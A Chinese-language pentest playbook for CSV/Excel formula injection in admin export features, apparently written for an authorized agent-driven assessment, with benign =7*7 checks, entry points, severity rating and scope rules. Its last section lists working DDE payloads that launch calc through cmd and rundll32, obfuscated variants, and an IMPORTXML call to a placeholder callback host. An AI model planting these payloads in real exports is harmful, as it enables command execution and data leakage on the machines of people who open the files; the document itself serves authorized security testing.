---
id: csv-injection
title: 公式注入手册（CSV/Excel 导出场景）
tags: csv,公式注入,excel,导出,s4
---
# 公式注入手册（OWASP 注入类冷门高发：导出被 Excel 打开时执行）

> 场景：用户可控值进入后台导出（用户列表/订单导出/日志导出）→ 管理员打开 Excel 时执行。

## 一、判据（无害）

```
# 写入测试值（仅测试账号自己的字段：昵称/备注/地址）
=DDEserver()  /  =7*7  /  @SUM(7*7)  /  +7*7  /  -7*7
# 验证：导出后用本地 LibreOffice/Excel 打开（**人工打开，容器内无 Excel 执行链**）
# → 单元格显示 49 或触发 DDE 提示 = 确证（cwe-1236）
# 载体差异：CSV 直出 vs XLSX 模板填充（sharedStrings.xml 检查输出转义）
```

## 二、高发入口

- 用户资料字段（昵称/签名）、退款备注、订单留言、导入模板回显（导入校验回显位）。
- 报表系统字段别名自定义位。

## 三、危害定级

- 公式求值/DDE 可达 → 中危（需管理员打开文件的前置条件，如实写利用条件）。
- 输出转义完备（前缀 ' 或格式化）→ ruled_out 附证据。

## 四、纪律

- 只在测试账号自己的可控字段注入；导出文件仅测试侧打开；DDE 类判据**用本地无害目标**（=7*7），不构造外联下载类公式（避免触发目标侧告警外的第三方交互）。
- **无凭证三态路由（v5.1）**：①客户提供测试账号 → 按第一节全流程；②仅匿名 → 只做无凭证可完成的**导出入口枚举与参数位识别**（登记候选矩阵），落库注入与导出打开验证逐条 record_vt/needs_follow_up 移交（禁止静默跳过）；③无入口 → needs_follow_up 显式登记。禁止自动注册（ROE identity.auto_register）。

### DDE 与外联族补全

DDE 具体形态：`DDE("cmd";"/C calc";"!A0")A0`、`@SUM(1+1)*cmd|' /C calc'!A0`、`=cmd|' /C calc'!'A1'`。混淆变体：`AAAA+BBBB-CCCC&"Hello"/12345&cmd|'/c calc.exe'!A`、`=         cmd|'/c calc.exe'!A`（=后多空白）、`=rundll32|'URL.dll,OpenURL calc.exe'!A`。Google Sheets IMPORT* 外联族（表格拉取不可信 CSV 时）：`=IMPORTXML("http://callback/","//a/@href")`、`=IMPORTRANGE/IMPORTHTML/IMPORTFEED/IMPORTDATA`。方法论补：sink 地图加审计日志导出/账单报表/搜索导出/**ZIP 导出内文件名**；打开环境需匹配受害者工作流（Excel 桌面/LibreOffice/Google Sheets/**地区小数分隔符**）；证据记录表格软件版本号。